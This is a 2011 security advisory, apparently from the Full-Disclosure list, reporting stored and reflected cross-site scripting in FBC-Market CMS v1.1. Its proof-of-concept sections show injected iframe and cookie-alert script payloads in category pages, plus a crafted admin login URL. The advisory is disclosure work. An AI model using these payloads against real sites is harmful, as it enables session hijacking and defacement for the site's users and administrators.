Title:
======
FBC-Market CMS v1.1 - Multiple Web Vulnerabilities


Date:
=====
2011-09-22


VL-ID:
=====
281


Reference:
==========
http://www.vulnerability-lab.com/get_content.php?id=281



Introduction:
=============
FBC-Market is a application that allows you to run your own online marketplace or classifieds listing site 
similar to Craigslist. It was written in PHP and uses MySQL to for data storage. Additionally, it uses 
jQuery for elegant effects and that web 2.0 pizzazz you ve always dreamed of.

The general design is simple and clean which should go well with any site, customization can be done easily 
through the CSS file. You can add your header and footer to it or include it in an iframe and you are ready 
to roll. And if you want to get your hands dirty in code, the comments will help you know what is going on.

(Copy of the Vendor Homepage: http://www.freeboxclub.com/)


Abstract:
=========
Vulnerability-Lab Team discovered multiple persistent Web Vulnerabilities on FreeBoxClubs FBC-Market CMS v1.1 web application.


Report-Timeline:
================
2011-09-22:	Public or Non-Public Disclosure


Status:
========
Published


Affected Products:
==================
FBC-Market CMS v1.1


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium(+)


Details:
========
1.1
Multiple input validation vulnerabilities(persistent) are detected on FreeBoxClubs FBC-Market CMS v1.1 web application. 
Attackers can include persistent malicious script codes to manipulate specific customer requests & modules. 
The vulnerability allows an attacker also to hijack customer/admin sessions via persistent script code inject.
The vulnerabilities are located on the category add module of the application.

Vulnerable Module(s):
								[+] Categories Add/List, newItem & Index

			
Pictures:
								../1.png
								../2.png
								../3.png


1.2
An client-side input validation vulnerability(non-persistent) is detected on FreeBoxClubs FBC-Market CMS v1.1 web application. 
Remote attackers can hijack customer/admin accounts via malicious link on client side with medium required user inter action.

Vulnerable Module(s):
								[+] Login

Pictures:
								../1.png


Proof of Concept:
=================
The vulnerabilities can be exploited by local low privileged user accounts or remote attackers with medium 
required user inter action or local low privileged user accounts. For demonstration or reproduce  ...


1.1
Module: newItem.php

<div id="header">
  <div style="display: inline; float: right;">
  <form name="searchForm" action="index.php" method="get" 
style="display: inline; float: right;">
  Search:	<input name="q" size="8" maxlength="40" value="" type="text">
	
<input name="" value="Go" type="submit">
  </form>
  </div>
    &#8203;&#8203;&#8203;&#8203;&#8203;<ul>
    	<li id=""><a href="index.php?a=1">All</a></li>
    	
<li><a href="index.php?category=5">>&#8203;&#8203;&#8203;&#8203;&#8203;"<iframe 
src="http://www.vulnerability-lab.com" heigh<="" a="" width="700"></li
>
<li ><a href='index.php?category=6'>>"<iframe src=http://www.vulnerability-lab.com width="900" heigh               <==]
</a></li>
<li ><a href='index.php?category=7'>>"<iframe src=http://www.vulnerability-lab.com                           <==]
width="700" heigh</a></li>
<li ><a href='index.php?category=8'></a></li>
<li ><
a href='index.php?category=9'> s</a></li>
<li ><a href='index.php?category=4'>>"<iframe 
src=http://google.com></a></li>
    </ul>
  </div>
  <div id="md_container">
  <div id="md
_contentForm">
  <br clear="all" />
    <div id='newItemForm'>
    <form action="controller.php" method="post"  
enctype="multipart/form-data" name="form1" id="form1">
      <table border="0" cellpadding="8" cellspacing="0">
       
 <tr>


Module: categories.php

<td>&#8203;&#8203;&#8203;&#8203;&#8203;>"&#8203;&#8203;&#8203;&#8203;
&#8203;<iframe src="http://www.vulnerability-lab.com" heigh<="" td="" width="700">
      <td>0</td>
	  
<td><a href='javascript:editCat("5", ">"<iframe src=http://www.vulnerability-lab.com width="700" heigh", "0")         <==]
'>Edit</a> 
	    | <a href="javascript:deleteCategory('5','>"<iframe src=http://www.vulnerability-lab.com                   <==]
width="700" heigh')"  style="color:maroon">Delete</a></td>
    </tr>
	    <tr> 
      <td> 
>"<iframe src=http://www.vulnerability-lab.com width="900" heigh</td>                                                   <==]
      <td>0</td>
	  <td><
;a href='javascript:editCat("6", ">"<iframe src=http://www.vulnerability-lab.com width="900" heigh", "0")'>Edit</a> 
	    
| <a href="javascript:deleteCategory('6','>"<iframe src=http://www.vulnerability-lab.com width="900" heigh')"  style="color:
maroon">Delete</a></td>
    </tr>
	    <tr> 
      <td>>"<iframe src=http://www.vulnerabil
ity-lab.com width="700" heigh</td>
      <td>0</td>
	  <td><a href='javascript:editCat("7", ">"&
lt;iframe src=http://www.vulnerability-lab.com width="700" heigh", "0")'>Edit</a> 
	    | <a href="javascript:
deleteCategory('7','>"<iframe src=http://www.vulnerability-lab.com width="700" heigh')"  style="color:maroon">Delete<
/a></td>
    </tr>
	    <tr> 
      <td>>"<iframe src=http://google.com></td>
      
<td>1</td>
	  <td><a href='javascript:editCat("4", ">"<iframe src=http://test.com>", "1")'>
Edit</a> 
	    | <a href="javascript:deleteCategory('4','>"<iframe src=http://google.com>')"  style="color:
maroon">Delete</a></td>
    </tr>
	
  </table>
   </form>
  <script language="JavaScript">


Module: index.php

<div id="header">
  <div style="display: inline; float: right;">
  <form name="searchForm" action="index.php" method="get" 
style="display: inline; float: right;">
  Search:	<input name="q" size="8" maxlength="40" value="" type="text">
	
<input name="" value="Go" type="submit">
  </form>
  </div>
    &#8203;&#8203;&#8203;&#8203;&#8203;<ul>
    	<li id="current"><a href="index.php?a=1&k=12qwaszxx3EEd">
All</a></li>
    	<li><a href="index.php?category=5&k=12qwaszxx3EEd">>"&#8203;&#8203;&#8203;
&#8203;&#8203;<iframe src="http://www.vulnerability-lab.com" 
heigh<="" a="" width="700"></li>
<li ><a href='index.php?category=6&k=12qwaszxx3EEd'>>"<iframe src=
http://www.vulnerability-lab.com width="900" heigh</a></li>                                       <==]
<li ><a href='index.php?category=7&k=12qwaszx
x3EEd'>>"<iframe src=http://www.vulnerability-lab.com width="700" heigh</a></li>
<li ><a href='index.php?category=8&k=12qwaszxx3EEd'></a></li>
<li ><a href='index.php?category=9&k=12qwaszxx3EEd'> s</a
></li>
<li ><a href='index.php?category=10&k=12qwaszxx3EEd'>>"<script>alert(document.cookie)</script
></a></li>
<li ><a href='index.php?category=4&k=12qwaszxx3EEd'>>"<iframe src=http://google.com
></a></li>
<li ><a href='index.php?category=12&k=12qwaszxx3EEd'>>>"<<script>alert
(document.cookie)</script></a></li>
<li ><a href='index.php?category=11&k=12qwaszxx3EEd'>>>"<
<script>alert(document.cookie)</script></a></li>
    </ul>
  </div>
  <div id="md_container">

<
br clear="all" />	
<div id='md_listingBox'>


PoC:
				../newItem.php
				../categories.php
				../index.php


1.2

Module: Login

http://xxx.com/fbcmarket/admin/login.php?msg=HALLO%20THIS%20IS%20REM0VE%20YO
UR%20LOGIN%20IS%20NOT%20SECURE%3Cbr%3E%3Cbr%3E%3Ciframe%20src=http://vulnerability-lab.com%20width=1000%20height=800%3E%3E


Risk:
=====
The security risk of the persistent input validation vulnerabilities are estimated as medium(+).
The security risk of the client-side login xss (cross site Scripting) vulnerability is estimated as low(+).


Credits:
========
Vulnerability Research Laboratory -  WiiHac


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2011|Vulnerability-Lab




-- 
Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
